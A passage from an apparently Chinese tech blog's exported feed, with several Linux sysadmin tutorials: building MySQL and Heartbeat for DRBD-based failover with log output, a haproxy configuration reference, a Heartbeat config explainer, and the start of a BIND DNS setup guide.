2.我们还需要在slave上执行下面操作123456789101112#这样master就能和slave开始连接上了，并且保证数据不会丢失：[root@slave ~]# drbdadm connect r0[root@slave ~]# cat /proc/drbdversion: 8.4.4 (api:1/proto:86-101)GIT-hash: 599f286440bd633d15d5ff985204aff4bccffadd build by root@slave, 2013-12-03 09:50:30 0: cs:Connected ro:Secondary/Primary ds:UpToDate/UpToDate C r----- ns:0 nr:4 dw:6 dr:1688 al:1 bm:1 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0[root@master ~]# cat /proc/drbdversion: 8.4.4 (api:1/proto:86-101)GIT-hash: 599f286440bd633d15d5ff985204aff4bccffadd build by root@master, 2013-12-03 09:49:22 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r----- ns:4 nr:0 dw:1 dr:1015 al:1 bm:1 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0 安装mysql1.mastr节点12345678910111213141516171819202122232425[root@master Linux]# yum install gcc gcc-c++ autoconf automake ncurses-devel libtool-ltdl-devel* -y[root@master Linux]# useradd -M -s /sbin/nologin mysql[root@master Linux]# tar zfvx cmake-2.8.12.tar.gz[root@master Linux]# cd cmake-2.8.12[root@master cmake-2.8.12]# ./configure[root@master cmake-2.8.12]# gmake &amp;&amp; make install[root@master cmake-2.8.12]# cd ..[root@master Linux]# tar zfxv mysql-5.5.25.tar.gz[root@master Linux]# cd mysql-5.5.25[root@master mysql-5.5.25]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql-5.5[root@master mysql-5.5.25]# make &amp;&amp; make install[root@master mysql-5.5.25]# cp support-files/my-medium.cnf /raid10/mysql/my.cf[root@master mysql-5.5.25]# rm -rf /etc/my.cnf[root@master mysql-5.5.25]# ln -sv /raid10/mysql/my.cf /etc/[root@master mysql-5.5.25]# cd /usr/local/mysql-5.5/[root@master mysql-5.5]# chown -R root:mysql .[root@master mysql-5.5]# chown -R mysql:mysql /raid10/mysql/data/[root@master mysql-5.5]# ./scripts/mysql_install_db --user=mysql \--basedir=/usr/local/mysql-5.5/ \--datadir=/raid10/mysql/data/[root@master mysql-5.5]# cp support-files/mysql.server /etc/init.d/mysqld[root@master mysql-5.5]# chmod +x /etc/init.d/mysqld[root@master mysql-5.5]# chkconfig --add mysqld[root@master mysql-5.5]# vi /etc/init.d/mysqlddatadir=/raid10/mysql/data 2.savle节点安装1234567891011121314151617——安装mysql[MySQL主节点的savle节点安装][root@slave Linux]# yum install gcc gcc-c++ autoconf automake ncurses-devel libtool-ltdl-devel* -y[root@slaveLinux]# useradd -M -s /sbin/nologin mysql[root@slave Linux]# tar zfvx cmake-2.8.12.tar.gz[root@slave Linux]# cd cmake-2.8.12[root@slavecmake-2.8.12]# ./configure[root@slavecmake-2.8.12]# gmake &amp;&amp; make install[root@slavecmake-2.8.12]# cd ..[root@slave Linux]# tar zfxv mysql-5.5.25.tar.gz[root@slave Linux]# cd mysql-5.5.25[root@slave mysql-5.5.25]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql-5.5[root@slave mysql-5.5.25]# make &amp;&amp; make install[root@slave mysql-5.5.25]# cd /usr/local/mysql-5.5/[root@slave mysql-5.5]# chown -R root:mysql .[root@slave mysql-5.5]# cp support-files/mysql.server /etc/init.d/mysqld[root@slave mysql-5.5]# vi /etc/init.d/mysqlddatadir=/raid10/mysql/data MySQL主节点实现高可用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：以下操作在MySQL主节点的master、slave节点执行 1.添加hosts主机信息123[root@master Linux]# vi /etc/hosts192.168.2.10 master192.168.2.11 slave 2.添加用户和组12[root@master Linux]# groupadd haclient[root@master Linux]# useradd -g haclient -M -s /sbin/nologin hacluster 3.安装heartbeat安装相关软件依赖包1234567[root@master Linux]# yum install libtool automake autoconf \glib2-devel \libxml2-devel \bzip2-devel \libtool-ltdl-devel \libxslt-devel \docbook* -y 安装glue123456[root@master Linux]# wget http://hg.linux-ha.org/glue/archive/glue-1.0.9.tar.bz2[root@master Linux]# tar jfvx glue-1.0.9.tar.bz2[root@master Linux]# cd Reusable-Cluster-Components-glue--glue-1.0.9/[root@master Reusable-Cluster-Components-glue--glue-1.0.9]# ./autogen.sh[root@master Reusable-Cluster-Components-glue--glue-1.0.9]# ./configure LIBS='/lib64/libuuid.so.1'[root@CentOS Reusable-Cluster-Components-glue--glue-1.0.9]# make &amp;&amp; make install 安装agents1234567[root@master Heartbeat-3-0-7e3a82377fa8]# cd ..[root@master Linux]# wget https://codeload.github.com/ClusterLabs/resource-agents/legacy.tar.gz/v3.9.2[root@master Linux]# tar zfvx ClusterLabs-resource-agents-v3.9.2-0-ge261943.tar.gz[root@master Linux]# cd ClusterLabs-resource-agents-b735277/[root@master ClusterLabs-resource-agents-b735277]# ./autogen.sh[root@master ClusterLabs-resource-agents-b735277]# ./configure LIBS='/lib64/libuuid.so.1'[root@master ClusterLabs-resource-agents-b735277]# make &amp;&amp; make install 安装heartbeat1234567[root@master ClusterLabs-resource-agents-b735277]# cd ..[root@master Linux]# wget http://hg.linux-ha.org/heartbeat-STABLE_3_0/archive/7e3a82377fa8.tar.bz2[root@master Linux]# tar jfvx heartbeat-3.0.5.tar.bz2[root@master Linux]# cd Heartbeat-3-0-7e3a82377fa8/[root@master Heartbeat-3-0-7e3a82377fa8]# ./bootstrap[root@master Heartbeat-3-0-7e3a82377fa8]# ./ConfigureMe configure LIBS='/lib64/libuuid.so.1'[root@master Heartbeat-3-0-7e3a82377fa8]# make &amp;&amp; make install 4.配置heartbeat123456789101112131415161718192021222324252627282930313233343536373839404142[root@master Heartbeat-3-0-7e3a82377fa8]# cd doc[root@master doc]# cp authkeys haresources ha.cf /etc/ha.d/[root@master doc]# cp /usr/etc/ha.d/shellfuncs /etc/ha.d/[root@master doc]# rm -rf /usr/etc/ha.d[root@master doc]# ln -sv /etc/ha.d /usr/etc[root@master doc]# vi /etc/ha.d/ha.cf#开启日志logfile /var/log/ha-log#设置syslog()/logger设备logfacility local0#心跳发送时间间隔/秒keepalive 2#15秒没有收到主机心跳、确认主机故障deadtime 15#警告次数warntime 5#守护进程启动30后 启动服务资源initdead 30#监听端口udpport 694#另一个节点IP、通过检测来保证心跳的可用性ucast eth0 192.168.1.11ucast eth1 192.168.2.11#两个节点的名字 [uname -n 获取]node masternode slave#开启DPODrespawn hacluster /usr/lib64/heartbeat/ipfailrespawn hacluster /usr/lib64/heartbeat/dopdapiauth ipfail gid=haclient uid=haclusterapiauth dopd gid=haclient uid=hacluster[root@master doc]# vi /etc/ha.d/authkeysauth 11 sha1 HI![root@master doc]# chmod 600 /etc/ha.d/authkeys[root@master doc]# vi /etc/ha.d/haresourcesmaster drbddisk::r0 Filesystem::/dev/drbd0::/raid10::ext4 mysqld IPaddr::192.168.1.254/24/eth0[root@master doc]# cd /Linux/drbd-8.4.4/scripts/[root@master scripts]# cp drbddisk /etc/ha.d/resource.d/[root@master scripts]# cp /etc/init.d/mysqld /etc/ha.d/resource.d/[root@master scripts]# chkconfig --add heartbeat[root@master scripts]# chkconfig heartbeat on 测试1.启动master节点启动heartbeat1[root@master scripts]# /etc/init.d/heartbeat start 2.启动slave节点启动heartbeat1[root@slave scripts]# /etc/init.d/heartbeat start 3.在master节点上查看启动日志123456789101112[root@master ha.d]# tail -f /var/log/ha-logApr 26 21:11:48 master heartbeat: [42033]: info: Starting child client "/usr/lib64/heartbeat/ipfail" (501,501)Apr 26 21:11:48 master heartbeat: [42033]: info: Starting child client "/usr/lib64/heartbeat/dopd" (501,501)Apr 26 21:11:48 mster heartbeat: [42062]: info: Starting "/usr/lib64/heartbeat/ipfail" as uid 501 gid 501 (pid 42062)Apr 26 21:11:48 mster heartbeat: [42064]: info: Starting "/usr/lib64/heartbeat/dopd" as uid 501 gid 501 (pid 42064)Apr 26 21:11:48 mster heartbeat: [42061]: info: Local Resource acquisition completed.Apr 26 21:11:48 mster heartbeat: [42033]: info: Initial resource acquisition complete (req_our_resources)Apr 26 21:11:48 mster ipfail: [42062]: ERROR: auto_failback set to incompatible legacy option.Apr 26 21:11:48 mster heartbeat: [42033]: WARN: Managed /usr/lib64/heartbeat/ipfail process 42062 exited with return code 100.Apr 26 21:11:48 mster heartbeat: [42033]: info: Status update for slave: status activeharc[42104]: 2014/04/26_21:11:48 info: Running /usr/etc/ha.d//rc.d/status status#说明启动成功 4.切换主备在master节点停掉heartbeat1[root@master scripts]# /etc/init.d/heartbeat stop 查看slave日志是否能自动切换至slave节点1234567891011121314151617181920212223242526272829303132333435[root@slave scripts]# tail -f /var/log/ha-log#显示master节点已经shutdownApr 26 21:21:27 slave heartbeat: [42054]: info: Received shutdown notice from 'master'.Apr 26 21:21:27 slave heartbeat: [42054]: info: Resources being acquired from master.harc[42118]: 2014/04/26_21:21:27 info: Running /usr/etc/ha.d//rc.d/status statusApr 26 21:21:27 slave heartbeat: [42119]: info: No local resources [/usr/share/heartbeat/ResourceManager listkeys slave] to acquire.mach_down[42148]: 2014/04/26_21:21:27 info: Taking over resource group drbddisk::r0ResourceManager[42175]: 2014/04/26_21:21:27 info: Acquiring resource group: master drbddisk::r0 Filesystem::/dev/drbd0::/raid10::ext4 mysqld IPaddr::192.168.1.254/24/eth0ResourceManager[42175]: 2014/04/26_21:21:27 info: Running /etc/ha.d/resource.d/drbddisk r0 startFilesystem[42239]: 2014/04/26_21:21:27 INFO: Resource is stoppedResourceManager[42175]: 2014/04/26_21:21:27 info: Running /etc/ha.d/resource.d/Filesystem /dev/drbd0 /raid10 ext4 startFilesystem[42320]: 2014/04/26_21:21:27 INFO: Running start for /dev/drbd0 on /raid10Filesystem[42312]: 2014/04/26_21:21:28 INFO: SuccessResourceManager[42175]: 2014/04/26_21:21:28 info: Running /etc/ha.d/resource.d/mysqld startApr 26 21:21:39 slave heartbeat: [42054]: WARN: node master: is deadApr 26 21:21:39 slave heartbeat: [42054]: info: Dead node master gave up resources.Apr 26 21:21:39 slave heartbeat: [42054]: info: Resources being acquired from master.Apr 26 21:21:39 slave heartbeat: [42054]: info: Link master:eth0 dead.Apr 26 21:21:39 slave heartbeat: [42054]: info: Link master:eth1 dead.Apr 26 21:21:41 slave heartbeat: [42614]: info: No local resources [/usr/share/heartbeat/ResourceManager listkeys slave] to acquire.Apr 26 21:21:41 slave heartbeat: [42054]: info: Initial resource acquisition complete (req_our_resources)IPaddr[42642]: 2014/04/26_21:21:42 INFO: Resource is stopped#显示slave节点的VIP已经运行ResourceManager[42175]: 2014/04/26_21:21:42 info: Running /etc/ha.d/resource.d/IPaddr 192.168.1.254/24/eth0 startIPaddr[42727]: 2014/04/26_21:21:42 INFO: Using calculated netmask for 192.168.1.254: 255.255.255.0IPaddr[42727]: 2014/04/26_21:21:42 INFO: eval ifconfig eth0:0 192.168.1.254 netmask 255.255.255.0 broadcast 192.168.1.255IPaddr[42701]: 2014/04/26_21:21:42 INFO: Successmach_down[42148]: 2014/04/26_21:21:42 info: mach_down takeover complete for node master.harc[42820]: 2014/04/26_21:21:42 info: Running /usr/etc/ha.d//rc.d/status statusmach_down[42837]: 2014/04/26_21:21:42 info: Taking over resource group drbddisk::r0ResourceManager[42864]: 2014/04/26_21:21:43 info: Acquiring resource group: master drbddisk::r0 Filesystem::/dev/drbd0::/raid10::ext4 mysqld IPaddr::192.168.1.254/24/eth0#显示slave的mysql和drbd服务已经启动成功Filesystem[42906]: 2014/04/26_21:21:43 INFO: Running OKIPaddr[42987]: 2014/04/26_21:21:43 INFO: Running OKmach_down[42837]: 2014/04/26_21:21:43 info: mach_down takeover complete for node master.]]></content>
      <tags>
        <tag>HA集群</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[haproxy 基础配置文件详解]]></title>
    <url>%2F2017%2F08%2F10%2FHaproxy%2F5.%20haproxy%20%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[haproxy 基础配置文件详解 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HAproxy可以实现基于TCP（四层 例如:SSH,SMTP,MYSQL）和HTTP（七层 例如:web服务器）应用的代理软件，同时也可以作为负载均衡器使用，并且是开源完全免费的。HAproxy完全可以支持数以万计的并发链接，它的工作模式可以将其简单而安全地整合到当前的服务架构中，同时可以保护你的WEB服务器不暴露到网络上（设置成代理来实现的 通过VIP将后端的web服务器隐藏到内网中）。 HAProxy有以下几个优点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、免费开源，稳定性也非常好，其稳定性可以与硬件级别的F5 BIG-IP相媲美。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、负载带宽非常大。根据官方文档可知，HAproxy可以跑满10Gbps的带宽，对于软件级负载均衡器来说，是相当惊人的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3、支持链接拒绝。因为保护一个链接保持打开状态的开销是很低的，有时我们需要防止蠕虫攻击，也就是通过限制它们的连接打开来防止它们的危害，可以用于防止DDoS攻击，这也是其他负载均衡器所不具备的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;4、支持全透明代理（已具备硬件防火墙的典型特点）。可以用客户端IP地址或任何其他地址来链接后端服务器，这个特性仅在Linux 2.4/2.6 内核打了cttproxy补丁后才可以使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5、支持TCP层（四层）的负载均衡。HAproxy现在多用于线上的MySQL集群环境，常用它作为MySQL（读）负载均衡，不过在后端的MySQL Slaves数量超过10台时性能不如LVS，所以更推荐推荐LVS+Keepalived。一般情况下都是前端通过LVS做四层负载 HAProxy做后端web服务器的负载 这样性能会比单独用HAProxy高很多 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6、强大的监控服务。自带强大的监控服务器状态的页面，在生产环境中可结合Nagios来实现邮件或短信报警。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7、能支持多种的负载均衡算法，现在为止可以支持8种 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;8、支持虚拟主机。 haproxy 的配置文件（haproxy.conf）详解1.global local0日志设备，info日志级别，日志界别有：err warning info debug 4种。这个配置表示使用127.0.0.1上的rsyslog服务中的local0日志设备 maxconn 20480 最大并发数 daemon 后台模式 nbproc：进程数 user：需要些用户名 gid：需要写数字 pidfile：pid文件、 2.defaults mode：http tcp模式，http模式和health模式（健康检查已经废弃） retries：3 设置后端服务器的失败重试次数，如果连接失败的次数超过这里设置的值，haproxy就会对后端服务器标记不可用，也可以在后面进行设置 timeout connect 10s 设置成功连接到一台服务器的最长等待时间，默认单位是毫秒，也可以使用其他单位换算 timeout client 20s 设置成功连接客户端发动数据时最长等待时间，……………… imeout server 30s 设置服务器端回应客户端数据发送的最长等待时间………… timeout check 5s 设置对后端服务器的检测超时时间，………… 3.frontend frontend关键字定义了一个名字为www的前端虚拟节点 bind格式：bind [:] interface interface可选项，用来指定网络接口的名称，只在linux上使用 option httplog 默认情况下，haproxy日志是不记录http请求的，这样不方便haproxy的排错和监控，此项启动日志记录http请求 option forwardfor 后端服务器需要获得客户端的真实ip，就需要配置此参数 option httpclose: 此项表示客户端和服务器端完成一次连接请求后，haproxy将主动关闭tcp连接。这是对性能非常有帮助的参数 log global： 表示使用全局的日志配置， default_backend： 指定默认的后端服务器池，也就是指一组后端真是服务器，而真是服务器组将在backend段定义。这里的htmpool就是一个后端服务器组。 4.backend backend关键字定义了一个名为htmpool的后端真是服务器组。 mode http http模式 option redispatch：此参数用于cookie保持的环境中。在默认的环境下，HAProxy会将其请求的后端服务器的serverID插入到cookie中，以保证会话的session持久性。而如果后端的服务器出现故障，客户端的cookie是不会刷新的，这就会出现问题。此时如果设置此参数，将会将客户端的请求强制定向到另外一台监控的后端服务器上，一保证服务器的正常。 option abortonclose：如果设置此参数，在服务器负载很高的情况下，自动结束当前队列处理时间比较长的连接 balance：此关键字用来定义负载均衡算法：常用的算法有： 1.roundrobin：基于权重轮训 2.static-rr：静态权重轮训，运行时调整其服务器权重不会生效 3.source：ip算法，ip_hash，同一个客户端的请求转发在特定的后端服务器上 4.leastconn：此算法会将新的连接请求转发到最少连接数目的后端服务器，在回话时间较长的环境中使用，比如：数据库负载均衡等，不适合会话短的环境 5.uri：此算法会对部分或者整个URL进行hash运算，在经过与服务器的总权重相除，最后转发到某台匹配的后端服务器上 6.uri_param：此算法会根据URL路劲中的参数进行转发，这样可保证在后端真是服务器数量不变时，同一个用户的请求始终分发到一台机器上 7.hdr：此算法根据http头进行转发，如果指定的http头名称不存在，则使用roundrobin算法进行策略转发。 cookie：表示允许向cookie插入SERVERID，每台服务器的SERVERID可在下面的server关键字中使用cookie关键字定义 option httpchk：此选项表示启用http的服务状态监测功能。haproxy作为一个专业的负载均衡器，他支持对backend部分指定的后端服务器节点的健康检查，以保证在后端backend中某个节点不能服务时，吧从frotend段进来的客户端请求分配至backend中其他健康节点上，从而保证整理服务的可用性。option httpchk具体用法如下： 1option httpchk &lt;mothod&gt; &lt;uri&gt; &lt;version&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;method:常用的请求的方法：OPTIONS, GET,HEAD，一般用head方式，head仅检查response的head是不是状态码200，head相对get更快，更简单&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;uri：表示要检测的url地址，200为正常，其他都为错误&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;version：指定心跳检测时的http版本号 server：定义后端真实服务器，不能用于default和frontend部分，使用格式： 1server &lt;name&gt; &lt;address&gt;[:port] [param*] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数含义： ：后端服务器指定一个内部名称，随便写 [param*]：常用参数： check：表示启用对此后端服务器执行健康检查 inter：设置健康状态检查的时间间隔，单位毫秒 rise：社会中重故障状态转换正常状态的次数 fall：设置后端服务器从正常状态转换至不可用状态的检查次数： cookie：指定后端服务器设定的cookie值。 weight：权重，值1-256，0代表不参与负载均衡 backup：设置后端服务器的备份服务器，仅仅在后端所有真是服务器均不可用的情况下次啊启用 5.listen listen关键字定义了一个admin_stats的实例， stats refresh：设置haproxy监控统计页面自动刷新的时间。 stats uri：设置haproxy监控统计页面的URL路劲，通过ip：port/haproxy-status查看，路劲自己随意设置 stats realm：设置登录haproxy统计页面的密码框上的文本信息 stats auth：设置登录haproxy统计页面的用户名和密码。可以设置多个，设置多行 stats hide-version：用来隐藏统计页面上haproxy的版本信息 stats admin if TURE：在1.4.9版本以后，可以在监控页面上手工启动或者禁用后端服务器]]></content>
      <tags>
        <tag>haproxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[heartbeat 部署过程]]></title>
    <url>%2F2017%2F08%2F10%2FHA%E9%9B%86%E7%BE%A4%2F2.%20heartbeat%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[heartbeat 配置文件详解1 配置ha.cf&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一个是ha.cf该文件位于在安装后创建的/etc/ha.d目录中。该文件中包括为Heartbeat使用何种介质通路和如何配置他们的信息。在源代码目录中的ha.cf文件包含了您可以使用的全部选项，详述如下： serial /dev/ttyS0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用串口heartbeat－如果不使用串口heartbeat，则必须使用其他的介质，如bcast（以太网）heartbeat。用适当的设备文件代替/dev/ttyS0。 watchdog /dev/watchdog&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项是可选配置。通过Watchdog 功能可以获得提供最少功能的系统，该系统不提供heartbeat，可以在持续一份钟的不正常状态后重新启动。该功能有助于避免一台机器在被认定已经死亡之后恢复heartbeat的情况。如果这种情况发生并且磁盘挂载因故障而迁移（fail over），便有可能有两个节点同时挂载一块磁盘。如果要使用这项功能，则除了这行之外，也需要加载“softdog”内核模块，并创建相应的设备文件。方法是使用命令“insmod softdog”加载模块。然后输入“grep misc /proc/devices”并记住得到的数字（应该是10）。然后输入”cat /proc/misc | grep watchdog”并记住输出的数字（应该是130）。根据以上得到的信息可以创建设备文件，“mknod /dev/watchdog c 10 130”。 bcast eth1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示在eth1接口上使用广播heartbeat（将eth1替换为eth0，eth2，或者您使用的任何接口）。 mcast eth1 225.0.0.1 694 1 0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果采用组播通讯，在这里可以设置组播通讯所使用的接口，绑定的组播ip地址（在224.0.0.0-239.255.255.255之间），通讯端口，ttl(time to live)所能经过路由的跳数，是否允许回环（也就是本地发出的数据包是否还接收）。 ucast eth1 10.0.0.1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果采用单播，可以配置其网络接口及其所使用的ip地址。 keepalive 2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定heartbeat之间的时间间隔为2秒。 warntime 10&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在日志中发出“late heartbeat“警告之前等待的时间，单位为秒。 deadtime 30&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在30秒后宣布节点死亡。 initdead 120&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在某些配置下，重启后网络需要一些时间才能正常工作。这个单独的”deadtime”选项可以处理这种情况。它的取值至少应该为通常deadtime的两倍。 baud 19200&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;波特率，串口通信的速度。 udpport 694&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用端口694进行bcast和ucast通信。这是默认的，并且在IANA官方注册的端口号。 auto_failback on&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项是必须配置的。对于那些熟悉Tru64 Unix的人来说，heartbeat的工作方式类似于“favored member“模式。在failover之前，haresources文件中列出的主节点掌握所有的资源，之后从节点接管这些资源。当auto_failback设置为on时，一旦主节点重新恢复联机，将从从节点取回所有资源。若该选项设置为off，主节点便不能重新获得资源。该选项与废弃的nice_failback选项类似。如果要从一个nice_failback设置为off的集群升级到这个或更新的版本，需要特别注意一些事项以防止flash cut。请参阅FAQ中关于如何处理这类情况的章节。 node primary.mydomain.com&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项是必须配置的。集群中机器的主机名，与“uname –n”的输出相同。 node backup.mydomain.com&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项是必须配置的。同上。 respawn&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项是可选配置的：列出将要执行和监控的命令。例如：要执行ccm守护进程，则要添加如下的内容： respawn hacluster /usr/lib/heartbeat/ccm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使得Heartbeat以userid（在本例中为hacluster）的身份来执行该进程并监视该进程的执行情况，如果其死亡便重启之。对于ipfail，则应该是： respawn hacluster /usr/lib/heartbeat/ipfail&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于pingd则应该是： respawn hacluster /usr/lib64/heartbeat/pingd -m 100 -d 5s&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：如果结束进程的退出代码为100，则不会重启该进程。 apiauth pingd gid=haclient uid=hacluster2 配置haresources&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置好ha.cf文件之后，便是haresources文件。该文件列出集群所提供的服务以及服务的默认所有者。 注意：两个集群节点上的该文件必须相同。集群的IP地址是该选项是必须配置的，不能在haresources文件以外配置该地址, haresources文件用于指定双机系统的主节点、集群IP、子网掩码、广播地址以及启动的服务等。其配置语句格式如下： node-name network-config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中node-name指定双机系统的主节点，取值必须匹配ha.cf文件中node选项设置的主机名中的一个，node选项设置的另一个主机名成为从节点。network-config用于网络设置，包括指定集群IP、子网掩码、广播地址等。resource-group用于设置heartbeat启动的服务，该服务最终由双机系统通过集群IP对外提供。在本文中我们假设要配置的HA服务为Apache和Samba。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在haresources文件中需要如下内容： primary.mydomain.com 192.168.85.3 httpd smb &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该行指定在启动时，节点linuxha1得到IP地址192.168.85.3，并启动Apache和Samba。在停止时，Heartbeat将首先停止smb，然后停止Apache，最后释放IP地址192.168.85.3。这里假设命令“uname –n”的输出为“primary.mydomain.com”－如果输出为“primary”，便应使用“primary”。 primary.mydomain.com IPaddr::192.168.21.107/24/eth0 drbddisk::r0 Filesystem::/dev/drbd1::/data::ext4 nfs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正确配置好haresources文件之后，将ha.cf和haresource拷贝到/etc/ha.d目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：资源文件中能执行的命令必须在/etc/ha.d/resource.d/ 中可见 3 配置Authkeys&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要配置的第三个文件authkeys决定了您的认证密钥。共有三种认证方式：crc，md5，和sha1。您可能会问：“我应该用哪个方法呢？”简而言之： 如果您的Heartbeat运行于安全网络之上，如本例中的交叉线，可以使用crc，从资源的角度来看，这是代价最低的方法。如果网络并不安全，但您也希望降低CPU使用，则使用md5。最后，如果您想得到最好的认证，而不考虑CPU使用情况，则使用sha1，它在三者之中最难破解。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件格式如下： 1auth [] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，对于sha1，示例的/etc/ha.d/authkeys可能是 12auth 11 sha1 key-for-sha1-any-text-you-want &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于md5，只要将上面内容中的sha1换成md5就可以了。 对于crc，可作如下配置： 12auth 22 crc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不论您在关键字auth后面指定的是什么索引值，在后面必须要作为键值再次出现。如果您指定“auth 4”，则在后面一定要有一行的内容为“4 ”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;确保该文件的访问权限是安全的，如600。]]></content>
      <tags>
        <tag>HA集群</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS服务器(二)：使用bind实现主从DNS服务器数据同步]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F8.%20DNS%E6%9C%8D%E5%8A%A1%E5%99%A8(%E4%BA%8C)%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%2F</url>
    <content type="text"><![CDATA[DNS服务器(二)：使用bind实现主从DNS服务器数据同步一、bind简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux中通常使用bind来实现DNS服务器的架设，bind软件由isc(www.isc.org)维护。在yum仓库中可以找到软件，配置好yum源，直接使用命令yum install bind就可以安装。当前bind的稳定版本为bind9，bind的服务名称为named，监听的端口为53号端口。bind的主要配置文件为/etc/named.conf，此文件主要用于配置区域，并指定区域数据库文件名称。区域数据库文件通常保存于/var/named/目录下，用于定义区域的资源类型。 二、使用bind架设DNS服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例操作：以域名wubinary.com为例配置一个DNS服务器，实现正向解析与反向解析。 1.使用setup命令配置DNS服务器的IP地址，我们以192.168.0.70这个IP地址为例，在本地架设一个DNS服务器。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/01.jpeg?raw=true) 2.bind配置文件为/etc/named.conf，此文件用于定义区域。每个区域的数据文件保存在/var/named目录下。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;named.conf各参数项说明： 123456789options &#123;//全局选项&#125;zone "ZONE name"&#123;//定义区域&#125;logging&#123;//定义日志系统&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;named.conf文件内容如下： 12345678910111213141516171819202122232425262728 options &#123; listen-on port 53 &#123; 127.0.0.1; &#125;; #定义监听端口及IP地址 listen-on-v6 port 53 &#123; ::1; &#125;; #定义监听的IPv6地址 directory "/var/named"; #全局目录 dump-file "/var/named/data/cache_dump.db"; statistics-file "/var/named/data/named_stats.txt"; memstatistics-file "/var/named/data/named_mem_stats.txt"; allow-query &#123; localhost; &#125;;#允许查询的IP地址 recursion yes; #是否允许递归查询 dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto; /* Path to ISC DLV key */ bindkeys-file "/etc/named.iscdlv.key"; managed-keys-directory "/var/named/dynamic";&#125;;logging &#123; channel default_debug &#123; file "data/named.run"; severity dynamic; &#125;;&#125;;zone "." IN &#123; type hint; file "named.ca";&#125;;include "/etc/named.rfc1912.zones";include "/etc/named.root.key"; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：bind的配置文件/etc/named.conf里必须要定义的三个区域是：根、127.0.0.1和127.0.0.1的反解。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上options选项中有许多是我们用不到，我们先把它们注释掉。结果如下： 12345678910111213141516options &#123;// listen-on port 53 &#123; 127.0.0.1; &#125;;// listen-on-v6 port 53 &#123; ::1; &#125;; directory "/var/named"; dump-file "/var/named/data/cache_dump.db"; statistics-file "/var/named/data/named_stats.txt"; memstatistics-file "/var/named/data/named_mem_stats.txt";// allow-query &#123; localhost; &#125;;// recursion yes;// dnssec-enable yes;// dnssec-validation yes;// dnssec-lookaside auto; /* Path to ISC DLV key */// bindkeys-file "/etc/named.iscdlv.key";// managed-keys-directory 